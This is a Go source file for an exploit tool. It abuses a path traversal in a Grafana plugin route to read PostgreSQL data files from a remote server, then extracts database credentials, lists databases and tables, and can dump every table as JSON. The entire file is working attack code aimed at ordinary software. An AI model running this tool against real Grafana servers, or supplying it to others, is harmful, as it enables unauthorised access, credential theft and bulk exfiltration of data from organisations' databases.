package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: exploit <grafana-url> [command]")
		fmt.Fprintln(os.Stderr, "commands: summary, creds, dbs, tables <db>, columns <db> <table>, query <db> <table>, dump")
		os.Exit(1)
	}

	client := pgdump.NewRemoteClient(grafanaReader(os.Args[1], "/var/lib/postgresql/data"))
	cmd := "summary"
	if len(os.Args) > 2 {
		cmd = os.Args[2]
	}

	var result any
	switch cmd {
	case "summary":
		result = client.Summary()
	case "creds":
		result = client.Credentials()
	case "dbs":
		result = client.Databases()
	case "tables":
		if len(os.Args) < 4 {
			fmt.Fprintln(os.Stderr, "usage: tables <db>")
			os.Exit(1)
		}
		result = client.TablesByName(os.Args[3])
	case "columns":
		if len(os.Args) < 5 {
			fmt.Fprintln(os.Stderr, "usage: columns <db> <table>")
			os.Exit(1)
		}
		db := client.Database(os.Args[3])
		if db != nil {
			table := client.Table(db.OID, os.Args[4])
			if table != nil {
				result = client.Columns(db.OID, table.OID)
			}
		}
	case "query":
		if len(os.Args) < 5 {
			fmt.Fprintln(os.Stderr, "usage: query <db> <table>")
			os.Exit(1)
		}
		result = client.QueryByName(os.Args[3], os.Args[4], nil)
	case "dump":
		result = client.DumpAll()
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n", cmd)
		os.Exit(1)
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(result)
}

func grafanaReader(target, pgdata string) pgdump.RemoteReader {
	base := strings.TrimSuffix(target, "/")
	traversal := strings.Repeat("..%2f", 9)

	return func(path string) ([]byte, error) {
		url := base + "/public/plugins/alertlist/" + traversal + pgdata + "/" + path
		resp, err := http.Get(url)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("%d", resp.StatusCode)
		}
		return io.ReadAll(resp.Body)
	}
}
